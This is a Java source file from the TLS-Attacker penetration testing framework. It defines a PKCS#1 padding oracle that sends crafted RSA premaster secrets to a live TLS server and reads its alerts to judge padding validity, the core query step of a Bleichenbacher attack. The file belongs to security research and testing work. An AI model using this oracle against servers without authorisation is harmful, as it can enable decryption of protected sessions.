/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2016 Ruhr University Bochum / Hackmanit GmbH
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.tlsattacker.attacks.pkcs1.oracles;

import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.tlsattacker.tls.config.ClientCommandConfig;
import de.rub.nds.tlsattacker.tls.config.ClientConfigHandler;
import de.rub.nds.tlsattacker.tls.config.ConfigHandler;
import de.rub.nds.tlsattacker.tls.constants.ConnectionEnd;
import de.rub.nds.tlsattacker.tls.protocol.ProtocolMessage;
import de.rub.nds.tlsattacker.tls.protocol.alert.AlertMessage;
import de.rub.nds.tlsattacker.tls.protocol.ccs.ChangeCipherSpecMessage;
import de.rub.nds.tlsattacker.tls.protocol.handshake.CertificateMessage;
import de.rub.nds.tlsattacker.tls.protocol.handshake.RSAClientKeyExchangeMessage;
import de.rub.nds.tlsattacker.tls.protocol.handshake.ServerHelloDoneMessage;
import de.rub.nds.tlsattacker.tls.protocol.handshake.ServerHelloMessage;
import de.rub.nds.tlsattacker.tls.workflow.TlsContext;
import de.rub.nds.tlsattacker.tls.workflow.TlsContextAnalyzer;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowTraceType;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowConfigurationFactory;
import de.rub.nds.tlsattacker.tls.workflow.action.ReceiveAction;
import de.rub.nds.tlsattacker.tls.workflow.action.SendAction;
import de.rub.nds.tlsattacker.transport.TransportHandler;
import de.rub.nds.tlsattacker.util.MathHelper;
import java.security.PublicKey;
import java.security.interfaces.RSAPublicKey;
import java.util.LinkedList;
import java.util.List;
import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.core.LoggerContext;
import org.apache.logging.log4j.core.config.Configuration;
import org.apache.logging.log4j.core.config.LoggerConfig;

/**
 * 
 * @author Juraj Somorovsky <juraj.somorovsky@rub.de>
 */
public class RealDirectMessagePkcs1Oracle extends Pkcs1Oracle {

    ClientCommandConfig config;

    public RealDirectMessagePkcs1Oracle(PublicKey pubKey, ClientCommandConfig clientConfig) {
	this.publicKey = (RSAPublicKey) pubKey;
	this.blockSize = MathHelper.intceildiv(publicKey.getModulus().bitLength(), 8);
	this.config = clientConfig;
	this.config.setWorkflowTraceType(WorkflowTraceType.CLIENT_HELLO);

	LoggerContext ctx = (LoggerContext) LogManager.getContext(false);
	Configuration ctxConfig = ctx.getConfiguration();
	LoggerConfig loggerConfig = ctxConfig.getLoggerConfig(LogManager.ROOT_LOGGER_NAME);
	loggerConfig.setLevel(Level.INFO);
	ctx.updateLoggers();
    }

    @Override
    public boolean checkPKCSConformity(final byte[] msg) {

	ConfigHandler configHandler = new ClientConfigHandler();
	TransportHandler transportHandler = configHandler.initializeTransportHandler(config);
	TlsContext tlsContext = configHandler.initializeTlsContext(config);
	WorkflowExecutor workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);

	List<ProtocolMessage> protocolMessages = new LinkedList<>();
	protocolMessages.add(new ServerHelloMessage());
	protocolMessages.add(new CertificateMessage());
	protocolMessages.add(new ServerHelloDoneMessage());
	tlsContext.getWorkflowTrace().add(new ReceiveAction(protocolMessages));
	protocolMessages = new LinkedList<>();
	RSAClientKeyExchangeMessage cke = new RSAClientKeyExchangeMessage();
	protocolMessages.add(cke);
	protocolMessages.add(new ChangeCipherSpecMessage());
	tlsContext.getWorkflowTrace().add(new SendAction(protocolMessages));

	protocolMessages = new LinkedList<>();
	protocolMessages.add(new AlertMessage());
	tlsContext.getWorkflowTrace().add(new ReceiveAction(protocolMessages));

	ModifiableByteArray pms = new ModifiableByteArray();
	pms.setModification(ByteArrayModificationFactory.explicitValue(msg));
	cke.setEncryptedPremasterSecret(pms);

	WorkflowConfigurationFactory.appendProtocolMessagesToWorkflow(tlsContext, protocolMessages);

	if (numberOfQueries % 100 == 0) {
	    LOGGER.info("Number of queries so far: {}", numberOfQueries);
	}

	boolean valid = true;
	try {
	    workflowExecutor.executeWorkflow();
	} catch (Exception e) {
	    valid = false;
	    e.printStackTrace();
	} finally {
	    numberOfQueries++;
	    transportHandler.closeConnection();
	}

	if (TlsContextAnalyzer.containsAlertAfterModifiedMessage(tlsContext) == TlsContextAnalyzer.AnalyzerResponse.ALERT) {
	    valid = false;
	}

	return valid;
    }
}
